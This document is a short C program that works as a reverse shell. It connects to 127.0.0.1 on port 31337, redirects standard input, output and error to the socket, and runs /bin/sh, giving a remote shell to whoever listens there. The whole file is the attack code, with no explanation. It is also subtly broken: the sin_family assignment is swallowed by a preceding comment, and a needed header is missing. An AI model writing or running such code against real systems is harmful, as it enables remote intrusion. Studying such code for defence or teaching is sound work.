#include<stdio.h>
#include<unistd.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<netinet/ip.h>

#define PORT  31337
#define IP "127.0.0.1"

int soc, rc;
struct sockaddr_in srv_addr;

int main()
{ // populate sockaddr_in structure   srv_addr.sin_family=2;
  srv_addr.sin_addr.s_addr=inet_addr(IP); 
  srv_addr.sin_port=htons(PORT);  
  soc=socket(2,1,0);  
  rc = connect(soc, (struct sockaddr*)&srv_addr, 0x10);
  
  
  dup2(soc, 0);
  dup2(soc, 1);
  dup2(soc, 2);
  execve("/bin/sh",0,0);
}